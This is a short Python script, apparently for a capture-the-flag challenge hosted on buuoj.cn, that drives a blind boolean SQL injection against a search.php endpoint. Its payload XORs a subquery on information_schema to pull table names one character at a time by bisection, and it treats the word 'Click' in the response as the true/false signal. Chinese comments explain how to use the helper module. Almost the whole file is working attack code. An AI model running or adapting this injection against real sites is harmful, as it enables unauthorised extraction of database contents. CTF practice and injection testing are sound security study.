import BI_SQL as SQL

#引用二分法对应的循环迭代逻辑
central = SQL.BisectionMethod

url = "http://fe7b1015-39e9-4bf6-87fd-3149b519116a.node4.buuoj.cn:81/search.php"
method = "get"
params = {"id" : "1^(SELECT(ASCII(SUBSTR(((select(group_concat(table_name))from(information_schema.tables)where(table_schema=DATABASE()))),{},1)){}{}))^1"}
#将HTTP的相关参数传入,这里的参数名风格是基于requests模块的
req = SQL.Request(url, method, params = params)
'''
构造将变量数值填充到Payload的方法
函数参数格式推荐为如下的,其中req代表req模块类
args代表从循环迭代模生成的变量数值
关于此方法定义的具体细节请看后面Request部分'''
def makePoc(req, **args):
    req.params = req.rawParams.format(args["num"], args["sympol"], args["code"])
#将构造的方法指定到请求模块中
req.setPrePayloadFunc(makePoc)

#已于关键字检测模块
check = SQL.Check(SQL.checkMethod.checkText, checkModel = "A", keyStr = "Click")

#将模块传入容器
controller = SQL.Controller(central, req, check)
controller.run()